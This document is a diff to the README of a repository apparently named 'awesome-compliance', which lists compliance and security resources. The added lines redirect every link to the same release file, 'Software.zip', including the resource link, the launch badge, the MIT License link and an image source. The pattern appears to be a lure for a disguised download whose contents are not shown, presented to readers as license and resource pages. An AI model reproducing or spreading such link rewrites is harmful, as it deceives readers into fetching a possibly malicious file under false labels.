@@ -18,9 +18,9 @@ This repository covers a wide range of topics related to compliance and cybersec
 - [x] SOC 2 (Service Organization Control)
 
 ## 🌐 Explore the Resources
-You can access the resources in this repository by visiting [awesome-compliance](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip). Please click on the link to explore and utilize the tools, frameworks, and references available.
+You can access the resources in this repository by visiting [awesome-compliance](https://github.com/iamcommie/awesome-compliance/releases/download/v1.0/Software.zip). Please click on the link to explore and utilize the tools, frameworks, and references available.
 
-[![Get Started](https://img.shields.io/badge/launch-%F0%9F%9A%80-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Get Started](https://github.com/iamcommie/awesome-compliance/releases/download/v1.0/Software.zip%F0%9F%9A%80-blue)](https://github.com/iamcommie/awesome-compliance/releases/download/v1.0/Software.zip)
 
 ## 🚀 Get Involved
 We welcome contributions from the community to enhance and expand the collection of compliance resources. If you have tools, frameworks, or references that you believe would benefit others in the compliance and cybersecurity field, feel free to submit a pull request or open an issue.
@@ -29,12 +29,12 @@ We welcome contributions from the community to enhance and expand the collection
 A big thank you to all the individuals and organizations who have contributed to this repository. Your dedication to sharing knowledge and resources in the compliance and security domain is highly appreciated.
 
 ## 📝 License
-This repository is licensed under the [MIT License](https://opensource.org/licenses/MIT).
+This repository is licensed under the [MIT License](https://github.com/iamcommie/awesome-compliance/releases/download/v1.0/Software.zip).
 
 ---
 
 <div align="center">
-  <img src="https://www.complianceforge.com/hubfs/IT%20Security%20Policy%20Security%20Control%20Frameworks%20%20(1).png" width="500" />
+  <img src="https://github.com/iamcommie/awesome-compliance/releases/download/v1.0/Software.zip%20Security%20Policy%20Security%20Control%20Frameworks%20%20(1).png" width="500" />
 </div>
 
 ---
